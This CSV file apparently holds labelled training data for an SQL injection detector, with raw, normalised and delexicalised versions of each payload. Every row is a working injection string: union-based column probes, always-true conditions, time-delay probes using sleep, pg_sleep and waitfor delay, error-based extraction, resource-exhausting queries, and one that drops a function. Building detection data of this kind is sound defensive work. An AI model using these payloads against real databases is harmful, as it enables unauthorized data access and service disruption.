payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"-4811%'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '","-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",-<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt' = 'qipt","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and <STR> = 'qipt",1,False,,sqli_dataset
"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","1"" ) as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","<NUM>"" ) as wxea where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x4b774c75 ) ) ) ) ) ,<NUM> ) #",1,True,,sqli_dataset
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""eoab"" like ""eoab","1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""eoab"" like ""eoab",<NUM><STR>eoab<STR>eoab,1,True,,sqli_dataset
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '","-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and ( ( ( '%' = '",-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1' ) where 7646 = 7646 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>' ) where <NUM> = <NUM> and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--","1%"" ) union all select null,null,null,null,null,null,null,null,null,null--","<NUM>%"" ) union all select null,null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"-6389"" union all select 2355,2355,2355,2355,2355--","-6389"" union all select 2355,2355,2355,2355,2355--","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1""   )    )    as chal where 6661  =  6661","1"" ) ) as chal where 6661 = 6661","<NUM>"" ) ) as chal where <NUM> = <NUM>",1,False,,sqli_dataset
1'   )    )    as iipj where 6560  =  6560,1' ) ) as iipj where 6560 = 6560,<NUM>' ) ) as iipj where <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag","1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag",<NUM><STR>fiag<STR>fiag,1,False,,sqli_dataset
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'ejdk' like 'ejdk,<NUM><STR>ejdk<STR>ejdk,1,False,,sqli_dataset
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#","-9941 union all select 1321,1321,1321,1321,1321,1321,1321#","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa","1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""okpa"" = ""okpa",<NUM><STR>okpa<STR>okpa,1,True,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and <STR> = '",1,False,,sqli_dataset
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#","-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#","-<NUM>' ) ) as wisk where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
-9363%' or   (  8459  =  8459  )  *4906 and '%'  =  ',-9363%' or ( 8459 = 8459 ) *4906 and '%' = ',-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '","1%' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--","-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #","1 ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #","<NUM> ) ) ) or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #",1,False,,sqli_dataset
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm","1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""czvm"" like ""czvm",<NUM><STR>czvm<STR>czvm,1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo","call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'ahjo' = 'ahjo","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and ( <STR> = 'ahjo",1,False,,sqli_dataset
-3044'  )   or 4999  =  3051#,-3044' ) or 4999 = 3051#,-<NUM>' ) or <NUM> = <NUM>#,1,False,,sqli_dataset
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  ""","1%"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
if  (  4735  =  8907  )   select 4735 else drop function qigo--,if ( 4735 = 8907 ) select 4735 else drop function qigo--,if ( <NUM> = <NUM> ) select <NUM> else drop function qigo--,1,False,,sqli_dataset
"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --","1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --","<NUM> ) ) as cbdx where <NUM> = <NUM> and elt ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1 where 5485 = 5485 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM> where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,select pg_sleep ( 5 ) and 'rpka' = 'rpka,select pg_sleep ( <NUM> ) and <STR> = 'rpka,1,False,,sqli_dataset
"1""  )   as esks where 1138  =  1138","1"" ) as esks where 1138 = 1138","<NUM>"" ) as esks where <NUM> = <NUM>",1,False,,sqli_dataset
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk","1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'cipk' = 'cipk",<NUM><STR>cipk<STR>cipk,1,True,,sqli_dataset
-1700%' or 4149  =  3391#,-1700%' or 4149 = 3391#,-<NUM>%' or <NUM> = <NUM>#,1,False,,sqli_dataset
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,select ( case when ( 9619 = 8679 ) then 1 else 9619* ( select 9619 from master..sysdatabases ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from master..sysdatabases ) end ) --,1,False,,sqli_dataset
1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1' in boolean mode ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,<NUM>' in boolean mode ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  '","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( '%' = '","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( <STR> = '",1,False,,sqli_dataset
-1621' in boolean mode  )   order by 1--,-1621' in boolean mode ) order by 1--,-<NUM>' in boolean mode ) order by <NUM>--,1,False,,sqli_dataset
"1""  )   as mibc where 3113  =  3113","1"" ) as mibc where 3113 = 3113","<NUM>"" ) as mibc where <NUM> = <NUM>",1,False,,sqli_dataset
select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,select ( case when ( 5290 = 1720 ) then 5290 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --,1,False,,sqli_dataset
"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  ""","1%"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%'   )    )     )   union all select null,null#","1%' ) ) ) union all select null,null#","<NUM>%' ) ) ) union all select null,null#",1,False,,sqli_dataset
"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye","select sleep ( 5 ) and ( ( ""vzye"" = ""vzye","select sleep ( <NUM> ) and ( ( <STR> = ""vzye",1,False,,sqli_dataset
-9739' or 8571  =  8571--,-9739' or 8571 = 8571--,-<NUM>' or <NUM> = <NUM>--,1,False,,sqli_dataset
1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',1'|| ( select 'exls' where 3837 = 3837 and sleep ( 5 ) ) ||',<NUM><STR>exls<STR>,1,False,,sqli_dataset
1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1%' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM>%' ) ) and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
1  )   where 7159  =  7159,1 ) where 7159 = 7159,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw","( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""avyw"" = ""avyw","( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( <STR> = ""avyw",1,False,,sqli_dataset
"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --","1' ) ) as omwk where 1414 = 1414 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>' ) ) as omwk where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--","-9179"" ) union all select 7144,7144,7144,7144,7144,7144,7144,7144--","-<NUM>"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","1' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","<NUM>' ) ) as wkys where <NUM> = <NUM> and <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --",1,False,,sqli_dataset
"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv","select pg_sleep ( 5 ) and ( ( ( ""nvuv"" like ""nvuv","select pg_sleep ( <NUM> ) and ( ( ( <STR> like ""nvuv",1,False,,sqli_dataset
"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'","1'|| ( select 'qwoo' from dual where 8802 = 8802 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",<NUM><STR>qwoo<STR>,1,False,,sqli_dataset
"1""  )   as qayu where 6222  =  6222 union all select null,null,null#","1"" ) as qayu where 6222 = 6222 union all select null,null,null#","<NUM>"" ) as qayu where <NUM> = <NUM> union all select null,null,null#",1,False,,sqli_dataset
"1  )   union all select null,null,null,null,null,null,null#","1 ) union all select null,null,null,null,null,null,null#","<NUM> ) union all select null,null,null,null,null,null,null#",1,False,,sqli_dataset
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>"" ) ) or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --","1"" ) as lkzz where 3565 = 3565 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>"" ) as lkzz where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --","1 ) ) as yfvg where 1454 = 1454 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --","<NUM> ) ) as yfvg where <NUM> = <NUM> and row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) --",1,True,,sqli_dataset
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1"" ) as klur where 7046 = 7046 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM>"" ) as klur where <NUM> = <NUM> and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
1'+  (  select tdkt where 4535  =  4535,1'+ ( select tdkt where 4535 = 4535,<NUM>'+ ( select tdkt where <NUM> = <NUM>,1,True,,sqli_dataset
1'  )   where 5145  =  5145,1' ) where 5145 = 5145,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  ""","1%"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ckmm' like 'ckmm,<NUM><STR>ckmm<STR>ckmm,1,False,,sqli_dataset
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa","1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'zypa' = 'zypa",<NUM><STR>zypa<STR>zypa,1,True,,sqli_dataset
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  ""","( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""%"" = ""","( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( ( ( <STR> = """,1,False,,sqli_dataset
"1'  )   where 9951  =  9951   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --","1' ) where 9951 = 9951 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --","<NUM>' ) where <NUM> = <NUM> ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from ( values ( <NUM> ) ) ) --",1,False,,sqli_dataset
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo","1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""djwo"" = ""djwo",<NUM><STR>djwo<STR>djwo,1,False,,sqli_dataset
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1' ) ) as icik where 1440 = 1440 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>' ) ) as icik where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,select ( case when ( 1412 = 5313 ) then 1412 else 1412* ( select 1412 from mysql.db ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) #,1,False,,sqli_dataset
"-3737%"" union all select 4452,4452,4452#","-3737%"" union all select 4452,4452,4452#","-<NUM>%"" union all select <NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1'   )    )    and 3814  =  4272--,1' ) ) and 3814 = 4272--,<NUM>' ) ) and <NUM> = <NUM>--,1,False,,sqli_dataset
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk","select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'nlrk' like 'nlrk","select benchmark ( <NUM>,md5 ( 0x4c4d6142 ) ) and <STR> like 'nlrk",1,True,,sqli_dataset
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'hcpo' like 'hcpo,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'hcpo' like 'hcpo,<NUM><STR>hcpo<STR>hcpo,1,True,,sqli_dataset
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'","call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) ) +'",1,True,,sqli_dataset
"1""  )   where 2680  =  2680 or elt  (  5873  =  5873,sleep  (  5   )    )   #","1"" ) where 2680 = 2680 or elt ( 5873 = 5873,sleep ( 5 ) ) #","<NUM>"" ) where <NUM> = <NUM> or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #",1,False,,sqli_dataset
"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #","1"" where 2309 = 2309 or elt ( 5873 = 5873,sleep ( 5 ) ) #","<NUM>"" where <NUM> = <NUM> or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #",1,False,,sqli_dataset
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select ( case when ( 5198 = 2518 ) then 5198 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--,1,False,,sqli_dataset
1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,1' ) waitfor delay '0:0:5' and ( 'vtfs' = 'vtfs,<NUM><STR><NUM>:<NUM>:<NUM><STR>vtfs<STR>vtfs,1,False,,sqli_dataset
select   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  select 8711 from master..sysdatabases  )   end  )  --,select ( case when ( 8711 = 6432 ) then 1 else 8711* ( select 8711 from master..sysdatabases ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from master..sysdatabases ) end ) --,1,False,,sqli_dataset
"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#","-8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
-8504 where 3086  =  3086 or 1131  =  9188#,-8504 where 3086 = 3086 or 1131 = 9188#,-<NUM> where <NUM> = <NUM> or <NUM> = <NUM>#,1,False,,sqli_dataset
